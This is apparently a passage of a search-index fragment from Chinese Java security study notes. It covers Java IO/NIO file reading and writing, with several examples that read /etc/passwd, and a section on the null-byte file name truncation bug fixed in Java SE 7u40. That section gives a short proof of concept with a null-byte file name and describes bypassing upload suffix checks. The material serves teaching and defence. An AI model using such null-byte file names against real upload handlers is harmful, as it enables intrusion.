\u521b\u5efa\u4e8c\u8fdb\u5236\u8f93\u51fa\u6d41\u5bf9\u8c61 ByteArrayOutputStream out = new ByteArrayOutputStream (); // \u5faa\u73af\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 while (( a = raf . read ( bytes )) != - 1 ) { // \u622a\u53d6\u7f13\u51b2\u533a\u6570\u7ec4\u4e2d\u7684\u5185\u5bb9\uff0c(bytes, 0, a)\u5176\u4e2d\u76840\u8868\u793a\u4ecebytes\u6570\u7ec4\u7684 // \u4e0b\u68070\u5f00\u59cb\u622a\u53d6\uff0ca\u8868\u793a\u8f93\u5165\u6d41read\u5230\u7684\u5b57\u8282\u6570\u3002 out . write ( bytes , 0 , a ); } System . out . println ( out . toString ()); } catch ( IOException e ) { e . printStackTrace (); } } } // RandomAccessFile \u5199\u5165\u6587\u4ef6\u793a\u4f8b import java.io.File ; import java.io.IOException ; import java.io.RandomAccessFile ; public class Main { public static void main ( String [] args ) { File file = new File ( \"./test.txt\" ); // \u5b9a\u4e49\u5f85\u5199\u5165\u6587\u4ef6\u5185\u5bb9 String content = \"Hello World\" ; try { // \u521b\u5efaRandomAccessFile\u5bf9\u8c61,rw\u8868\u793a\u4ee5\u8bfb\u5199\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u4e00\u5171\u6709:r(\u53ea\u8bfb)\u3001rw(\u8bfb\u5199)\u3001 // rws(\u8bfb\u5199\u5185\u5bb9\u540c\u6b65)\u3001rwd(\u8bfb\u5199\u5185\u5bb9\u6216\u5143\u6570\u636e\u540c\u6b65)\u56db\u79cd\u6a21\u5f0f\u3002 RandomAccessFile raf = new RandomAccessFile ( file , \"rw\" ); // \u5199\u5165\u5185\u5bb9\u4e8c\u8fdb\u5236\u5230\u6587\u4ef6 raf . write ( content . getBytes ()); raf . close (); } catch ( IOException e ) { e . printStackTrace (); } } } FileSystemProvider # \u524d\u9762\u7ae0\u8282\u63d0\u5230\u4e86JDK7\u65b0\u589e\u7684NIO.2\u7684 java.nio.file.spi.FileSystemProvider ,\u5229\u7528 FileSystemProvider \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u652f\u6301\u5f02\u6b65\u7684\u901a\u9053( Channel )\u6a21\u5f0f\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 java.nio.file.Files \u662fJDK7\u5f00\u59cb\u63d0\u4f9b\u7684\u4e00\u4e2a\u5bf9\u6587\u4ef6\u8bfb\u5199\u53d6\u975e\u5e38\u4fbf\u6377\u7684API\uff0c\u5176\u5e95\u5c42\u5b9e\u5728\u662f\u8c03\u7528\u4e86 java.nio.file.spi.FileSystemProvider \u6765\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7684\u8bfb\u5199\u7684\u3002\u6700\u4e3a\u5e95\u5c42\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.ch.FileDispatcherImpl#read0 \u6253\u5f00FileChannel\u7684\u8c03\u7528\u94fe sun.nio.ch.FileChannelImpl.<init>(FileChannelImpl.java:89) sun.nio.ch.FileChannelImpl.open(FileChannelImpl.java:105) sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:137) sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:148) sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:212) java.nio.file.Files.newByteChannel(Files.java:361) java.nio.file.Files.newByteChannel(Files.java:407) java.nio.file.Files.readAllBytes(Files.java:3152) com.anbai.sec.filesystem.FilesDemo.main(FilesDemo.java:23) \u6587\u4ef6\u8bfb\u53d6\u7684\u8c03\u7528\u94fe sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:147) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103) java.nio.file.Files.read(Files.java:3105) java.nio.file.Files.readAllBytes(Files.java:3158) com.anbai.sec.filesystem.FilesDemo.main(FilesDemo.java:23) // \u4f7f\u7528FileSystemProvider\u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Path ; import java.nio.file.Paths ; public class Main { public static void main ( String [] args ) throws Exception { Path path = Paths . get ( \"/etc/passwd\" ); try { byte [] bytes = Files . readAllBytes ( path ); System . out . println ( new String ( bytes )); } catch ( IOException e ) { e . printStackTrace (); } } } // \u4f7f\u7528FileSystemProvider\u5199\u5165\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Path ; import java.nio.file.Paths ; public class Main { public static void main ( String [] args ) throws Exception { Path path = Paths . get ( \"./test.txt\" ); String content = \"Hello World\" ; try { Files . write ( path , content . getBytes ()); } catch ( IOException e ) { e . printStackTrace (); } } }","title":"java IO/NIO\u591a\u79cd\u8bfb\u5199\u6587\u4ef6\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/#java-ionio\u591a\u79cd\u8bfb\u5199\u6587\u4ef6\u65b9\u5f0f","text":"\u6211\u4eec\u901a\u5e38\u8bfb\u5199\u6587\u4ef6\u90fd\u662f\u4f7f\u7528\u7684\u963b\u585e\u6a21\u5f0f\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u4e5f\u5c31\u662f java.io.FileSystem \u3002 java.io.FileInputStream \u7c7b\u63d0\u4f9b\u4e86\u5bf9\u6587\u4ef6\u7684\u8bfb\u53d6\u529f\u80fd\uff0cjava\u7684\u5176\u4ed6\u8bfb\u53d6\u6587\u4ef6\u7684\u65b9\u6cd5\u57fa\u672c\u4e0a\u90fd\u662f\u5c01\u88c5\u4e86 java.io.FileInputStream \u7c7b\uff0c\u6bd4\u5982\uff1a java.io.FileReader \u3002","title":"java IO/NIO\u591a\u79cd\u8bfb\u5199\u6587\u4ef6\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/#fileinputstream","text":"FileInputStream\u8c03\u7528\u94fe java.io.FileInputStream.readBytes(FileInputStream.java:219) java.io.FileInputStream.read(FileInputStream.java:233) com.anbai.sec.filesystem.FileInputStreamDemo.main(FileInputStreamDemo.java:27) \u5176\u4e2dreadBytes\u662fnative\u65b9\u6cd5\uff0c\u6587\u4ef6\u7684\u6253\u5f00\u3001\u5173\u95ed\u7b49\u65b9\u6cd5\u4e5f\u90fd\u662fnative\u65b9\u6cd5 private native int readBytes(byte b[], int off, int len) throws IOException; private native void open0(String name) throws FileNotFoundException; private native int read0() throws IOException; private native long skip0(long n) throws IOException; private native int available0() throws IOException; private native void close0() throws IOException; FileInputStream \u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.ByteArrayOutputStream ; import java.io.File ; import java.io.FileInputStream ; public class Main { public static void main ( String [] args ) throws Exception { File file = new File ( \"/etc/passwd\" ); // \u6253\u5f00\u6587\u4ef6\u5bf9\u8c61\u5e76\u521b\u5efa\u6587\u4ef6\u8f93\u5165\u6d41 FileInputStream fis = new FileInputStream ( file ); // \u5b9a\u4e49\u6bcf\u6b21\u8f93\u5165\u6d41\u8bfb\u53d6\u5230\u7684\u5b57\u8282\u6570\u5bf9\u8c61 int a = 0 ; // \u5b9a\u4e49\u7f13\u51b2\u533a\u5927\u5c0f byte [] bytes = new byte [ 1024 ] ; // \u521b\u5efa\u4e8c\u8fdb\u5236\u8f93\u51fa\u6d41\u5bf9\u8c61 ByteArrayOutputStream out = new ByteArrayOutputStream (); // \u5faa\u73af\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 while (( a = fis . read ( bytes )) != - 1 ) { // \u622a\u53d6\u7f13\u51b2\u533a\u6570\u7ec4\u4e2d\u7684\u5185\u5bb9\uff0c(bytes, 0, a)\u5176\u4e2d\u76840\u8868\u793a\u4ecebytes\u6570\u7ec4\u7684 // \u4e0b\u68070\u5f00\u59cb\u622a\u53d6\uff0ca\u8868\u793a\u8f93\u5165\u6d41read\u5230\u7684\u5b57\u8282\u6570\u3002 out . write ( bytes , 0 , a ); } System . out . println ( out . toString ()); } }","title":"FileInputStream"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/#fileoutputstream","text":"FileOutputStream \u5199\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.io.File ; import java.io.FileOutputStream ; public class FileOutputStreamDemo { public static void main ( String [] args ) throws IOException { // \u5b9a\u4e49\u5199\u5165\u6587\u4ef6\u8def\u5f84 File file = new File ( \"/tmp/1.txt\" ); // \u5b9a\u4e49\u5f85\u5199\u5165\u6587\u4ef6\u5185\u5bb9 String content = \"Hello World.\" ; // \u521b\u5efaFileOutputStream\u5bf9\u8c61 FileOutputStream fos = new FileOutputStream ( file ); // \u5199\u5165\u5185\u5bb9\u4e8c\u8fdb\u5236\u5230\u6587\u4ef6 fos . write ( content . getBytes ()); fos . flush (); fos . close (); } }","title":"FileOutputStream"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/#randomaccessfile","text":"Java\u63d0\u4f9b\u4e86\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u7c7b: java.io.RandomAccessFile ,\u8fd9\u4e2a\u7c7b\u540d\u5b57\u9762\u610f\u601d\u662f\u4efb\u610f\u6587\u4ef6\u5185\u5bb9\u8bbf\u95ee\uff0c\u7279\u522b\u4e4b\u5904\u662f\u8fd9\u4e2a\u7c7b\u4e0d\u4ec5\u53ef\u4ee5\u50cf java.io.FileInputStream \u4e00\u6837\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u50cf java.io.FileOutputStream \u5199\u6587\u4ef6 // RandomAccessFile \u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.* ; public class Main { public static void main ( String [] args ) throws Exception { File file = new File ( \"/etc/passwd\" ); try { // \u521b\u5efaRandomAccessFile\u5bf9\u8c61,r\u8868\u793a\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u4e00\u5171\u6709:r(\u53ea\u8bfb)\u3001rw(\u8bfb\u5199)\u3001 // rws(\u8bfb\u5199\u5185\u5bb9\u540c\u6b65)\u3001rwd(\u8bfb\u5199\u5185\u5bb9\u6216\u5143\u6570\u636e\u540c\u6b65)\u56db\u79cd\u6a21\u5f0f\u3002 RandomAccessFile raf = new RandomAccessFile ( file , \"r\" ); // \u5b9a\u4e49\u6bcf\u6b21\u8f93\u5165\u6d41\u8bfb\u53d6\u5230\u7684\u5b57\u8282\u6570\u5bf9\u8c61 int a = 0 ; // \u5b9a\u4e49\u7f13\u51b2\u533a\u5927\u5c0f byte [] bytes = new byte [ 1024 ] ; // \u521b\u5efa\u4e8c\u8fdb\u5236\u8f93\u51fa\u6d41\u5bf9\u8c61 ByteArrayOutputStream out = new ByteArrayOutputStream (); // \u5faa\u73af\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 while (( a = raf . read ( bytes )) != - 1 ) { // \u622a\u53d6\u7f13\u51b2\u533a\u6570\u7ec4\u4e2d\u7684\u5185\u5bb9\uff0c(bytes, 0, a)\u5176\u4e2d\u76840\u8868\u793a\u4ecebytes\u6570\u7ec4\u7684 // \u4e0b\u68070\u5f00\u59cb\u622a\u53d6\uff0ca\u8868\u793a\u8f93\u5165\u6d41read\u5230\u7684\u5b57\u8282\u6570\u3002 out . write ( bytes , 0 , a ); } System . out . println ( out . toString ()); } catch ( IOException e ) { e . printStackTrace (); } } } // RandomAccessFile \u5199\u5165\u6587\u4ef6\u793a\u4f8b import java.io.File ; import java.io.IOException ; import java.io.RandomAccessFile ; public class Main { public static void main ( String [] args ) { File file = new File ( \"./test.txt\" ); // \u5b9a\u4e49\u5f85\u5199\u5165\u6587\u4ef6\u5185\u5bb9 String content = \"Hello World\" ; try { // \u521b\u5efaRandomAccessFile\u5bf9\u8c61,rw\u8868\u793a\u4ee5\u8bfb\u5199\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u4e00\u5171\u6709:r(\u53ea\u8bfb)\u3001rw(\u8bfb\u5199)\u3001 // rws(\u8bfb\u5199\u5185\u5bb9\u540c\u6b65)\u3001rwd(\u8bfb\u5199\u5185\u5bb9\u6216\u5143\u6570\u636e\u540c\u6b65)\u56db\u79cd\u6a21\u5f0f\u3002 RandomAccessFile raf = new RandomAccessFile ( file , \"rw\" ); // \u5199\u5165\u5185\u5bb9\u4e8c\u8fdb\u5236\u5230\u6587\u4ef6 raf . write ( content . getBytes ()); raf . close (); } catch ( IOException e ) { e . printStackTrace (); } } }","title":"RandomAccessFile"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/#filesystemprovider","text":"\u524d\u9762\u7ae0\u8282\u63d0\u5230\u4e86JDK7\u65b0\u589e\u7684NIO.2\u7684 java.nio.file.spi.FileSystemProvider ,\u5229\u7528 FileSystemProvider \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u652f\u6301\u5f02\u6b65\u7684\u901a\u9053( Channel )\u6a21\u5f0f\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 java.nio.file.Files \u662fJDK7\u5f00\u59cb\u63d0\u4f9b\u7684\u4e00\u4e2a\u5bf9\u6587\u4ef6\u8bfb\u5199\u53d6\u975e\u5e38\u4fbf\u6377\u7684API\uff0c\u5176\u5e95\u5c42\u5b9e\u5728\u662f\u8c03\u7528\u4e86 java.nio.file.spi.FileSystemProvider \u6765\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7684\u8bfb\u5199\u7684\u3002\u6700\u4e3a\u5e95\u5c42\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.ch.FileDispatcherImpl#read0 \u6253\u5f00FileChannel\u7684\u8c03\u7528\u94fe sun.nio.ch.FileChannelImpl.<init>(FileChannelImpl.java:89) sun.nio.ch.FileChannelImpl.open(FileChannelImpl.java:105) sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:137) sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:148) sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:212) java.nio.file.Files.newByteChannel(Files.java:361) java.nio.file.Files.newByteChannel(Files.java:407) java.nio.file.Files.readAllBytes(Files.java:3152) com.anbai.sec.filesystem.FilesDemo.main(FilesDemo.java:23) \u6587\u4ef6\u8bfb\u53d6\u7684\u8c03\u7528\u94fe sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:147) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109) sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103) java.nio.file.Files.read(Files.java:3105) java.nio.file.Files.readAllBytes(Files.java:3158) com.anbai.sec.filesystem.FilesDemo.main(FilesDemo.java:23) // \u4f7f\u7528FileSystemProvider\u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Path ; import java.nio.file.Paths ; public class Main { public static void main ( String [] args ) throws Exception { Path path = Paths . get ( \"/etc/passwd\" ); try { byte [] bytes = Files . readAllBytes ( path ); System . out . println ( new String ( bytes )); } catch ( IOException e ) { e . printStackTrace (); } } } // \u4f7f\u7528FileSystemProvider\u5199\u5165\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Path ; import java.nio.file.Paths ; public class Main { public static void main ( String [] args ) throws Exception { Path path = Paths . get ( \"./test.txt\" ); String content = \"Hello World\" ; try { Files . write ( path , content . getBytes ()); } catch ( IOException e ) { e . printStackTrace (); } } }","title":"FileSystemProvider"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/","tags":["java","java\u5b89\u5168"],"text":"java \u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e # \u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e\u6f0f\u6d1e\u5728\u8bf8\u591a\u7f16\u7a0b\u8bed\u8a00\u4e2d\u90fd\u5b58\u5728\uff0c\u7a76\u5176\u6839\u672c\u662fJava\u5728\u8c03\u7528\u6587\u4ef6\u7cfb\u7edf(C\u5b9e\u73b0)\u8bfb\u5199\u6587\u4ef6\u65f6\u5bfc\u81f4\u7684\u6f0f\u6d1e\uff0c\u5e76\u4e0d\u662fJava\u672c\u8eab\u7684\u5b89\u5168\u95ee\u9898\u3002\u4e0d\u8fc7\u597d\u5728\u9ad8\u7248\u672c\u7684JDK\u5728\u5904\u7406\u6587\u4ef6\u65f6\u5df2\u7ecf\u628a\u7a7a\u5b57\u8282\u6587\u4ef6\u540d\u8fdb\u884c\u4e86\u5b89\u5168\u68c0\u6d4b\u5904\u7406\u3002 \u6f0f\u6d1e\u5386\u53f2 # \u6f0f\u6d1e\u5b58\u5728\u4e8e java SE 7 update 40 \u4e4b\u524d \u6f0f\u6d1e\u5728 2013\u5e749\u670810\u65e5 \u53d1\u5e03\u7684 java SE 7 Update 40 \u4fee\u590d \u4fee\u590d\u65b9\u6cd5: \u5728 java.io.File \u7c7b\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e2a isInvalid \u65b9\u6cd5\uff0c\u4e13\u95e8\u68c0\u6d4b\u6587\u4ef6\u540d\u4e2d\u662f\u5426\u5305\u542b\u4e86\u7a7a\u5b57\u8282, \u4fee\u590d\u7684JDK\u7248\u672c\u6240\u6709\u8ddf\u6587\u4ef6\u540d\u76f8\u5173\u7684\u64cd\u4f5c\u90fd\u8c03\u7528\u4e86isInvalid\u65b9\u6cd5\u68c0\u6d4b\uff0c\u9632\u6b62\u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad final boolean isInvalid () { if ( status == null ) { status = ( this . path . indexOf ( '\\u0000' ) < 0 ) ? PathStatus . CHECKED : PathStatus . INVALID ; } return status == PathStatus . INVALID ; } \u6f0f\u6d1e\u5229\u7528 # import java.io.File ; import java.io.FileOutputStream ; import java.io.IOException ; public class FileNullBytes { public static void main ( String [] args ) { try { String fileName = \"/tmp/null-bytes.txt\\u0000.jpg\" ; FileOutputStream fos = new FileOutputStream ( new File ( fileName )); fos . write ( \"Test\" . getBytes ()); fos . flush (); fos . close (); } catch ( IOException e ) { e . printStackTrace (); } } } // \u4f7f\u7528JDK1.7.0.40\u4e4b\u524d\u7684\u7248\u672c\u6210\u529f\u622a\u65ad\u5199\u5165null-bytes.txt // \u4f7f\u7528JDK1.7.0.40\u53ca\u4e4b\u540e\u7684\u7248\u672c\u629b\u51fajava.io.FileNotFoundException: Invalid file path\u5f02\u5e38 \u6f0f\u6d1e\u5229\u7528\u573a\u666f # Java\u7a7a\u5b57\u8282\u622a\u65ad\u5229\u7528\u573a\u666f\u6700\u5e38\u89c1\u7684\u5229\u7528\u573a\u666f\u5c31\u662f\u6587\u4ef6\u4e0a\u4f20\u65f6\u540e\u7aef\u83b7\u53d6\u6587\u4ef6\u540d\u540e\u4f7f\u7528\u4e86 endWith \u3001\u6b63\u5219\u4f7f\u7528\u5982: .(jpg|png|gif)$ \u9a8c\u8bc1\u6587\u4ef6\u540d\u540e\u7f00\u5408\u6cd5\u6027\u4e14\u6587\u4ef6\u540d\u6700\u7ec8\u539f\u6837\u4fdd\u5b58,\u540c\u7406\u6587\u4ef6\u5220\u9664( delete )\u3001\u83b7\u53d6\u6587\u4ef6\u8def\u5f84( getCanonicalPath )\u3001\u521b\u5efa\u6587\u4ef6( createNewFile )\u3001\u6587\u4ef6\u91cd\u547d\u540d( renameTo )\u7b49\u65b9\u6cd5\u4e5f\u53ef\u9002\u7528\u3002 \u4fee\u590d\u65b9\u6848 # \u6700\u7b80\u5355\u76f4\u63a5\u7684\u65b9\u5f0f\u5c31\u662f\u5347\u7ea7JDK\uff0c\u5982\u679c\u62c5\u5fc3\u5347\u7ea7JDK\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\u53ef\u5728\u6587\u4ef6\u64cd\u4f5c\u65f6\u68c0\u6d4b\u4e0b\u6587\u4ef6\u540d\u4e2d\u662f\u5426\u5305\u542b\u7a7a\u5b57\u8282\uff0c\u5982JDK\u7684\u4fee\u590d\u65b9\u5f0f: fileName.indexOf('\\u0000') \u5373\u53ef","title":"java \u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/#java-\u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e","text":"\u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e\u6f0f\u6d1e\u5728\u8bf8\u591a\u7f16\u7a0b\u8bed\u8a00\u4e2d\u90fd\u5b58\u5728\uff0c\u7a76\u5176\u6839\u672c\u662fJava\u5728\u8c03\u7528\u6587\u4ef6\u7cfb\u7edf(C\u5b9e\u73b0)\u8bfb\u5199\u6587\u4ef6\u65f6\u5bfc\u81f4\u7684\u6f0f\u6d1e\uff0c\u5e76\u4e0d\u662fJava\u672c\u8eab\u7684\u5b89\u5168\u95ee\u9898\u3002\u4e0d\u8fc7\u597d\u5728\u9ad8\u7248\u672c\u7684JDK\u5728\u5904\u7406\u6587\u4ef6\u65f6\u5df2\u7ecf\u628a\u7a7a\u5b57\u8282\u6587\u4ef6\u540d\u8fdb\u884c\u4e86\u5b89\u5168\u68c0\u6d4b\u5904\u7406\u3002","title":"java \u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5386\u53f2","text":"\u6f0f\u6d1e\u5b58\u5728\u4e8e java SE 7 update 40 \u4e4b\u524d \u6f0f\u6d1e\u5728 2013\u5e749\u670810\u65e5 \u53d1\u5e03\u7684 java SE 7 Update 40 \u4fee\u590d \u4fee\u590d\u65b9\u6cd5: \u5728 java.io.File \u7c7b\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e2a isInvalid \u65b9\u6cd5\uff0c\u4e13\u95e8\u68c0\u6d4b\u6587\u4ef6\u540d\u4e2d\u662f\u5426\u5305\u542b\u4e86\u7a7a\u5b57\u8282, \u4fee\u590d\u7684JDK\u7248\u672c\u6240\u6709\u8ddf\u6587\u4ef6\u540d\u76f8\u5173\u7684\u64cd\u4f5c\u90fd\u8c03\u7528\u4e86isInvalid\u65b9\u6cd5\u68c0\u6d4b\uff0c\u9632\u6b62\u6587\u4ef6\u540d\u7a7a\u5b57\u8282\u622a\u65ad final boolean isInvalid () { if ( status == null ) { status = ( this . path . indexOf ( '\\u0000' ) < 0 ) ? PathStatus . CHECKED : PathStatus . INVALID ; } return status == PathStatus . INVALID ; }","title":"\u6f0f\u6d1e\u5386\u53f2"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528","text":"import java.io.File ; import java.io.FileOutputStream ; import java.io.IOException ; public class FileNullBytes { public static void main ( String [] args ) { try { String fileName = \"/tmp/null-bytes.txt\\u0000.jpg\" ; FileOutputStream fos = new FileOutputStream ( new File ( fileName )); fos . write ( \"Test\" . getBytes ()); fos . flush (); fos . close (); } catch ( IOException e ) { e . printStackTrace (); } } } // \u4f7f\u7528JDK1.7.0.40\u4e4b\u524d\u7684\u7248\u672c\u6210\u529f\u622a\u65ad\u5199\u5165null-bytes.txt // \u4f7f\u7528JDK1.7.0.40\u53ca\u4e4b\u540e\u7684\u7248\u672c\u629b\u51fajava.io.FileNotFoundException: Invalid file path\u5f02\u5e38","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528\u573a\u666f","text":"Java\u7a7a\u5b57\u8282\u622a\u65ad\u5229\u7528\u573a\u666f\u6700\u5e38\u89c1\u7684\u5229\u7528\u573a\u666f\u5c31\u662f\u6587\u4ef6\u4e0a\u4f20\u65f6\u540e\u7aef\u83b7\u53d6\u6587\u4ef6\u540d\u540e\u4f7f\u7528\u4e86 endWith \u3001\u6b63\u5219\u4f7f\u7528\u5982: .(jpg|png|gif)$ \u9a8c\u8bc1\u6587\u4ef6\u540d\u540e\u7f00\u5408\u6cd5\u6027\u4e14\u6587\u4ef6\u540d\u6700\u7ec8\u539f\u6837\u4fdd\u5b58,\u540c\u7406\u6587\u4ef6\u5220\u9664( delete )\u3001\u83b7\u53d6\u6587\u4ef6\u8def\u5f84( getCanonicalPath )\u3001\u521b\u5efa\u6587\u4ef6( createNewFile )\u3001\u6587\u4ef6\u91cd\u547d\u540d( renameTo )\u7b49\u65b9\u6cd5\u4e5f\u53ef\u9002\u7528\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u573a\u666f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/#\u4fee\u590d\u65b9\u6848","text":"\u6700\u7b80\u5355\u76f4\u63a5\u7684\u65b9\u5f0f\u5c31\u662f\u5347\u7ea7JDK\uff0c\u5982\u679c\u62c5\u5fc3\u5347\u7ea7JDK\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\u53ef\u5728\u6587\u4ef6\u64cd\u4f5c\u65f6\u68c0\u6d4b\u4e0b\u6587\u4ef6\u540d\u4e2d\u662f\u5426\u5305\u542b\u7a7a\u5b57\u8282\uff0c\u5982JDK\u7684\u4fee\u590d\u65b9\u5f0f: fileName.indexOf('\\u0000') \u5373\u53ef","title":"\u4fee\u590d\u65b9\u6848"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","tags":["java","java\u5b89\u5168"],"text":"java\u53cd\u5c04\u673a\u5236 # \u901a\u8fc7java\u53cd\u5c04\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u52a8\u6001\u5730\u83b7\u53d6\u4ee5\u4e0b\u4e1c\u897f\uff1a - \u7c7b - \u5b9e\u4f8b - \u65b9\u6cd5\uff0c\u8c03\u7528\u65b9\u6cd5 - \u5c5e\u6027\uff0c\u5c5e\u6027\u503c - ... \u83b7\u53d6Class\u5bf9\u8c61 # \u6709\u4e09\u79cd\u65b9\u6cd5\u83b7\u53d6Class\u5bf9\u8c61\uff1a 1. \u7c7b\u540d.class 2. Class.forName(\"\") 3. classLoader.loadClass(\"\"); \u83b7\u53d6\u6570\u7ec4\u7c7b\u578b\u7684Class\u5bf9\u8c61\u6bd4\u8f83\u7279\u6b8a\uff1a Class <?> doubleArray = Class . forName ( \"[D\" ); //\u76f8\u5f53\u4e8edouble[].class Class <?> cStringArray = Class . 